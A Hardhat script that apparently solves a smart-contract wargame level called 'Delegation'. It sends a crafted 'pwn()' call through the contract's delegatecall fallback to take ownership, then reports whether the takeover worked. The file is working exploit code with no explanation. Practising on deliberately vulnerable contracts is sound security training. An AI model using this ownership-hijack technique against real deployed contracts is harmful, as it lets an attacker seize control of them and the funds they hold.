import { ethers } from "hardhat";

const CONTRACT_NAME = "Delegation";
const CONTRACT_ADDRESS = "0xF781b45d11A37c51aabBa1197B61e6397aDf1f78";

async function hack() {
  const [wallet] = await ethers.getSigners();

  const factory = await ethers.getContractFactory(CONTRACT_NAME);
  const contract = factory.attach(CONTRACT_ADDRESS);

  const iface = new ethers.utils.Interface(["function pwn()"]);
  const data = iface.encodeFunctionData("pwn");

  const tx = await wallet.sendTransaction({
    to: contract.address,
    data,
    gasLimit: 100000,
  });
  await tx.wait();

  const owner = await contract.owner();
  console.log("owner : ", owner);
  if (owner === wallet.address) console.log("🚀 Contract hacked");
  else console.log("❌ Contract not hacked");
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
hack().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
